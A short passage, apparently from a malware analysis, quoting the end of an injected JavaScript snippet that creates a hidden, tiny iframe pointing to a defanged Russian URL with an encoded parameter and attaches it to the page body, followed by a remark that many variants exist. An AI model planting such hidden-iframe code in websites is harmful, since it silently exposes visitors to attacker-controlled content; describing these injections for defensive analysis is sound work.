@@ -1,0 +1,12 @@
+,
+  'hxxp://​g3service​.ru​/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQQHDQAMAg==');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.get​ElementsByTagName('body')[0].append​Child(f);
+}
+
+There are a lot of variants of this script, again the content will var
